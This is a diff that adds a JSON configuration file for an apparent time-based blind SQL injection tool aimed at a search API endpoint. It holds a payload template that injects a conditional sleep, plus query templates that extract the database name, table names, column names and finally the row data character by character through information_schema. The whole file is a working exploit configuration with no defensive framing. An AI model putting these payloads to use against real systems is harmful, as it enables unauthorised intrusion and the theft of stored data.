@@ -1,0 +1,19 @@
+{
+    "target_url": "http://example.com/api/v1/search",
+    "method": "POST",
+    "target_param": "query",
+    "injection_type": "time",
+    "time_threshold": 3.0,
+    "success_keyword": "Welcome",
+    "payload_template": "admin' AND IF(({query}), sleep(3), 0)-- -",
+    "queries": {
+      "get_db": "ascii(substring((SELECT database()), {pos}, 1)) = {ascii_val}",
+      "get_tables": "ascii(substring((SELECT table_name FROM information_schema.tables WHERE table_schema='{db}' LIMIT {offset},1), {pos}, 1)) = {ascii_val}",
+      "get_columns": "ascii(substring((SELECT column_name FROM information_schema.columns WHERE table_name='{table}' LIMIT {offset},1), {pos}, 1)) = {ascii_val}",
+      "dump_data": "ascii(substring((SELECT {column} FROM {table} LIMIT {offset},1), {pos}, 1)) = {ascii_val}"
+    },
+    "headers": {
+      "User-Agent": "Mozilla/5.0",
+      "Content-Type": "application/json"
+    }
+  }
